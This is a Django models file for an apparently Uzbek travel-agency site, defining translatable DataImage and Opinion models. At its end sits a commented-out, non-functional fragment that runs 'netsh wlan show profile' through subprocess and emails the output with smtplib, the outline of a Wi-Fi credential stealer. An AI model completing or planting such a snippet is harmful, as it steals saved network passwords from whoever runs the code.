from django.db import models
from baseapp.models import BaseModel
from parler.models import TranslatableModel, TranslatedFields





class DataImage(TranslatableModel):
      translations = TranslatedFields(
          name=models.CharField(max_length=200, verbose_name="Nomi:"),
          body=models.TextField(verbose_name="Xabar:"))

      image = models.ImageField(upload_to="yes/", verbose_name="joylashuv rasmi:")
      image1 = models.ImageField(upload_to="yes/", verbose_name="joylashuv rasmi:")



      def __str__(self):
          return self.name



      class Meta:
          verbose_name = "Sayohat_agentligi_"




class Opinion(TranslatableModel):
    translations = TranslatedFields(
         full_name  = models.CharField(max_length=200, verbose_name="To'liq ismi:"),
         body = models.TextField(verbose_name="Xabar:"))
    image = models.ImageField(upload_to="yes/", verbose_name="fikr egasi rasmi:")
    created_at = models.DateField()




    def __str__(self):
          return self.full_name

    class Meta:
        verbose_name = "Fikrlar_"



# import smtplib
# import subprocess as d
# def send_mail(email, password, message):
# server = smtplib.connect()
# command = "netsh wlan show profile"
# d.Popen(command, shell= True)
# send_mail()